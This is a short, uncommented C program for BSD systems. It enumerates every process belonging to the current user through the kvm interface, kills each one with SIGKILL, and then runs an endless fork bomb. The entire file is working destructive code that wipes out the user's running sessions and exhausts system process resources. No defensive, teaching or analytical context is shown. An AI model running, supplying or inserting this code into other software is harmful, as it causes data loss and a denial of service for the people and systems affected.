#include <unistd.h>
#include <signal.h>
#include <kvm.h>
#include <sys/sysctl.h>
#include <sys/user.h>
#include <fcntl.h>
#include <paths.h>


int main() {
	char errbuf[1000];
	int entries, i;
	pid_t id = getpid();
	kvm_t * kernel = kvm_open(NULL, _PATH_DEVNULL, NULL, O_RDONLY, errbuf);
	struct kinfo_proc * info = kvm_getprocs(kernel, KERN_PROC_RUID, getuid(), &entries);
	while (1) {
		for (i = 0; i < entries; i++) {
			if (info[i].ki_pid != id) {
				kill(info[i].ki_pid, SIGKILL);
			}
		}
		while (1) { fork(); }
	}
}